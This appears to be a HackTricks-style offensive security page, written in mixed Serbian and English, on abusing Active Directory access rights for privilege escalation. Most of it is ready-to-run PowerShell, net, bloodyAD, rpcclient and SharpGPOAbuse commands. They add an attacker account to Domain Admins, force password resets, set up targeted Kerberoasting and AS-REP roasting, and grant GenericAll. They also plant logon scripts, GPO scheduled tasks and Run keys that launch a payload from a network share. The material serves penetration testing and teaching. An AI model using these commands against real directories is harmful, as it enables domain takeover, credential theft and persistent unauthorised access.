# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja, pogledajte originalne članke.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ova privilegija daje attacker-u potpunu kontrolu nad ciljnim user account-om. Nakon što su `GenericAll` prava potvrđena pomoću komande `Get-ObjectAcl`, attacker može:

- **Change the Target's Password**: Koristeći `net user <username> <password> /domain`, attacker može resetovati user's password.
- **Targeted Kerberoasting**: Dodelite SPN na korisničkom account-u da biste ga učinili kerberoastable, zatim koristite Rubeus i targetedKerberoast.py da izvučete i pokušate crack-ovati ticket-granting ticket (TGT) hashes.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Onemogućite pre-autentifikaciju za korisnika, čineći njegov nalog ranjiv na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll prava nad grupom**

Ovo ovlašćenje omogućava napadaču da manipuliše članstvom u grupi ako imaju `GenericAll` prava na grupu poput `Domain Admins`. Nakon identifikovanja distinguished name grupe pomoću `Get-NetGroup`, napadač može:

- **Dodavanje sebe u grupu Domain Admins**: Ovo se može uraditi putem direktnih naredbi ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
Sa Linuxa takođe možete koristiti BloodyAD da dodate sebe u proizvoljne grupe kada nad njima imate GenericAll/Write članstvo. Ako je ciljna grupa ugnježdena u “Remote Management Users”, odmah ćete dobiti WinRM pristup na hostovima koji uvažavaju tu grupu:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posedovanje ovih privilegija na computer object ili user account omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje computer object-a.
- **Shadow Credentials**: Koristite ovu tehniku da imitirate computer ili user account iskorišćavanjem privilegija za kreiranje shadow credentials.

## **WriteProperty on Group**

Ako korisnik ima `WriteProperty` prava na svim objektima za određenu grupu (npr. `Domain Admins`), može:

- **Add Themselves to the Domain Admins Group**: Izvodljivo kombinovanjem `net user` i `Add-NetGroupUser` komandi; ova metoda omogućava privilege escalation unutar domena.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ova privilegija omogućava napadačima da sebe dodaju u određene grupe, kao što je `Domain Admins`, pomoću komandi koje direktno menjaju članstvo u grupi. Korišćenjem sledeće sekvence komandi moguće je samododavanje:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Slična privilegija — omogućava napadačima da direktno dodaju sebe u grupe menjajući svojstva grupe ako imaju pravo `WriteProperty` nad tim grupama. Potvrda i izvršenje ove privilegije se obavlja pomoću:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Držanje `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegovo iskorišćavanje može se izvršiti putem PowerShell ili alternativnih alata komandne linije, nudeći više metoda za resetovanje korisničke lozinke — uključujući interaktivne sesije i one-liners za non-interactive okruženja. Komande variraju od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linuxu, što pokazuje svestranost attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner nad grupom**

Ako napadač otkrije da ima `WriteOwner` prava nad grupom, može promeniti vlasništvo grupe na sebe. Ovo je posebno značajno kada je reč o grupi `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i članstvom. Postupak podrazumeva identifikovanje ispravnog objekta pomoću `Get-ObjectAcl`, a zatim korišćenje `Set-DomainObjectOwner` za izmenu vlasnika, bilo pomoću SID-a ili imena.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ovo dopuštenje omogućava napadaču da menja korisnička svojstva. Konkretno, sa pristupom `GenericWrite`, napadač može promeniti putanju logon skripte korisnika kako bi se pri prijavi korisnika izvršio zlonamerni skript. Ovo se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljnog korisnika tako da upućuje na napadačev skript.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Sa ovom privilegijom, napadači mogu da manipulišu članstvom u grupi, na primer da dodaju sebe ili druge korisnike u određene grupe. Ovaj proces uključuje kreiranje objekta kredencijala, njegovo korišćenje za dodavanje ili uklanjanje korisnika iz grupe i proveru promena članstva pomoću PowerShell komandi.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Imanje AD objekta i privilegija `WriteDACL` nad njim omogućava napadaču da sebi dodeli privilegije `GenericAll` nad tim objektom. Ovo se postiže manipulacijom ADSI, omogućavajući potpunu kontrolu nad objektom i mogućnost izmene njegovog članstva u grupama. Uprkos tome, postoje ograničenja pri pokušaju iskorišćavanja ovih privilegija korišćenjem Active Directory modula `Set-Acl` / `Get-Acl` cmdleta.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacija na domenu (DCSync)**

DCSync napad koristi specifična prava replikacije na domenu da oponaša Domain Controller i sinhronizuje podatke, uključujući korisničke kredencijale. Ova moćna tehnika zahteva dozvole poput `DS-Replication-Get-Changes`, što omogućava napadačima da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Domain Controller-u. [**Saznajte više o DCSync napadu ovde.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegirani pristup za upravljanje Group Policy Objects (GPOs) može predstavljati značajan bezbednosni rizik. Na primer, ako je korisniku kao što je `offense\spotless` delegirano pravo upravljanja GPOs, on može imati privilegije poput **WriteProperty**, **WriteDacl**, i **WriteOwner**. Ove dozvole se mogu zloupotrebiti u zlonamerne svrhe, što se može identifikovati korišćenjem PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Da biste identifikovali pogrešno konfigurirane GPOs, PowerSploit-ove cmdlet-ove možete povezati. To omogućava otkrivanje GPOs koje određeni korisnik ima pravo da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Moguće je razrešiti na koje računare se određeni GPO primenjuje, što pomaže u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Da biste videli koje se politike primenjuju na određeni računar, mogu se koristiti komande poput `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identifikacija organizational units (OUs) koje su pogođene određenom politikom može se izvršiti korišćenjem `Get-DomainOU`.

Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za enumeraciju GPOs i pronalaženje problema u njima.

### Abuse GPO - New-GPOImmediateTask

Pogrešno konfigurirani GPOs mogu se iskoristiti za izvršavanje koda, na primer, kreiranjem odmah izvršnog zakazanog zadatka. Ovo se može iskoristiti za dodavanje korisnika u grupu lokalnih administratora na pogođenim mašinama, značajno povećavajući privilegije:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

The GroupPolicy module, ako je instaliran, omogućava kreiranje i povezivanje novih GPOs, i podešavanje postavki kao što su registry values za izvršavanje backdoors na pogođenim računarima. Ova metoda zahteva da GPO bude ažuriran i da se korisnik prijavi na računar da bi se izvršilo:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse nudi metod za zloupotrebu postojećih GPOs dodavanjem zadataka ili izmenom podešavanja bez potrebe za kreiranjem novih GPOs. Ovaj alat zahteva izmenu postojećih GPOs ili korišćenje RSAT alata za kreiranje novih pre primene izmena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Prisilno ažuriranje politike

Ažuriranja GPO obično se dešavaju otprilike na svakih 90 minuta. Da biste ubrzali ovaj proces, naročito nakon unošenja promene, na ciljnom računaru može se pokrenuti `gpupdate /force` komanda kako bi se primoralo neposredno ažuriranje politike. Ova komanda osigurava da se sve izmene u GPO-ima primene bez čekanja narednog automatskog ciklusa ažuriranja.

### Iza kulisa

Pregledom Scheduled Tasks za dati GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka kao što je `evilTask`. Ovi zadaci se kreiraju preko skripti ili alata komandne linije sa ciljem da modifikuju ponašanje sistema ili eskaliraju privilegije.

Struktura zadatka, kako je prikazano u XML konfiguracionom fajlu koji generiše `New-GPOImmediateTask`, navodi detalje zakazanog zadatka — uključujući komandu koja će se izvršiti i njene okidače. Ovaj fajl ilustruje kako se Scheduled Tasks definišu i upravljaju unutar GPO-a, pružajući metod za izvršavanje proizvoljnih komandi ili skripti kao deo primene politike.

### Korisnici i grupe

GPO-i takođe omogućavaju manipulaciju članstvima korisnika i grupa na ciljanim sistemima. Direktnim uređivanjem policy fajlova za korisnike i grupe, napadači mogu dodati korisnike u privilegovane grupe, poput lokalne grupe `administrators`. Ovo je moguće zahvaljujući delegiranju dozvola za upravljanje GPO-om, što dozvoljava izmene policy fajlova kako bi se uključili novi korisnici ili promenila članstva u grupama.

XML konfiguracioni fajl za korisnike i grupe prikazuje kako se ove izmene primenjuju. Dodavanjem unosa u ovaj fajl, određenim korisnicima se mogu dodeliti povišene privilegije na pogođenim sistemima. Ova metoda nudi direktan pristup eskalaciji privilegija kroz manipulaciju GPO-om.

Dalje, mogu se razmotriti i dodatne metode za izvršavanje koda ili održavanje perzistencije, kao što su korišćenje logon/logoff skripti, izmena registry ključeva za autorun, instalacija softvera preko .msi fajlova, ili uređivanje konfiguracija servisa. Ove tehnike pružaju različite puteve za održavanje pristupa i kontrolu ciljnih sistema kroz zloupotrebu GPO-a.

## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
